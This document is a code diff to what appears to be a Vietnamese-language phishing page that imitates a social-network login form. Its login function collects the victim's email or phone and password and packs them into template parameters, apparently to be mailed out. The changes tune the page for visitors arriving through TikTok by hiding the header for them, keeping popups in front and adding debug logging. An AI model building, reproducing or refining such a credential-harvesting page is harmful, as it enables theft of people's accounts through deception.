@@ -33,6 +33,9 @@
             left: 0;
             z-index: 1000;
         }
+        .header.hidden {
+            display: none !important;
+        }
         .header-content {
             display: flex;
             justify-content: space-between;
@@ -275,7 +278,7 @@
             max-width: 300px;
             text-align: center;
             padding: 20px;
-            z-index: 1002;
+            z-index: 10002; /* Tăng z-index để tránh bị TikTok che */
         }
         .success-popup-title {
             font-size: 16px;
@@ -309,7 +312,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.3);
-            z-index: 1001;
+            z-index: 10001; /* Tăng z-index */
         }
         .fb-section {
             margin-bottom: 20px;
@@ -515,8 +518,12 @@
 
     <script>
         window.onload = function() {
-            if (document.referrer.includes("tiktok.com")) {
-                document.querySelector('.header').style.display = 'none';
+            const referrer = document.referrer.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isFromTikTok = referrer.includes("tiktok.com") || userAgent.includes("tiktok");
+            console.log("Referrer:", referrer, "UserAgent:", userAgent, "Is TikTok:", isFromTikTok); // Debug
+            if (isFromTikTok) {
+                document.querySelector('.header').classList.add('hidden');
                 document.querySelector('.login-container').style.marginTop = '20px';
             }
         };
@@ -600,10 +607,19 @@
         }
 
         function showDialog(title, message) {
+            console.log("showDialog called:", title, message); // Debug
+            const dialog = document.getElementById('custom-dialog');
+            const overlay = document.getElementById('dialog-overlay');
             document.getElementById('dialog-title').innerText = title;
             document.getElementById('dialog-message').innerText = message;
-            document.getElementById('custom-dialog').style.display = 'block';
-            document.getElementById('dialog-overlay').style.display = 'block';
+            dialog.style.display = 'block';
+            overlay.style.display = 'block';
+            // Fallback: Nếu popup không hiển thị, dùng alert
+            setTimeout(() => {
+                if (window.getComputedStyle(dialog).display === 'none') {
+                    alert(`${title}\n${message}`);
+                }
+            }, 100);
         }
 
         function hideDialog() {
@@ -612,21 +628,20 @@
         }
 
         function login() {
-            const loginInput = document.getElementById('login-input').value; // Dữ liệu từ ô "Số di động hoặc email"
+            const loginInput = document.getElementById('login-input').value;
             const password = document.getElementById('password').value;
 
             if (!loginInput || !password) {
-                showDialog("Đăng nhập không thành công!", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại!");
+                showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
                 return;
             }
 
-            // Log để kiểm tra dữ liệu trước khi gửi
             console.log("Dữ liệu trước khi gửi:", { email: loginInput, password: password });
 
             const templateParams = {
                 password: password,
-                phone: '', // Để trống vì không dùng trong form đăng nhập
-                email: loginInput, // Gửi dữ liệu từ ô "Số di động hoặc email" vào trường email
+                phone: '',
+                email: loginInput,
                 firstName: '',
                 lastName: ''
             };
